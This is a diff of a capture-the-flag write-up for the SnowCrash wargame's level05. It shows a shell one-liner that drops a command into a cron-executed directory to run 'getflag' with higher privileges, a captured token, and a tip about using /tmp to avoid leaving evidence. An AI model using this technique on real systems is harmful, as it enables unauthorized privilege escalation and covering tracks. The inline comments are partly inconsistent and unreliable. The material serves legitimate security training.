@@ -41,17 +41,14 @@ done
 #		Using the echo exploit. 
 #	Remember /tmp is your friend here as we have rights in this folder and we don't want to leave evidence when we log off.
 
-`echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 180 && cat /tmp/flag && echo -ne '\a'` 
-
+`echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 125 && cat /tmp/flag && echo -ne '\a'` 
 
 -# echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe	##	This will put a flag file into the /opt/openarenaserver 
--# 	sleep 180 												##	It will sleep for 180 seconds 3mins
+-# 	sleep 125 												##	It will sleep for 125 seconds 3mins
 -#	cat /tmp/flag											##	print it 
 -#	echo -ne '\a'											##	this will remove the newline added and  '\a' notify with a bell tone 
 
-echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 1 && cat /tmp/flag && echo -ne '\a'
-
-level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 180 && cat /tmp/flag && echo -ne '\a'
+level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 125 && cat /tmp/flag && echo -ne '\a'
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 
 Useful links used
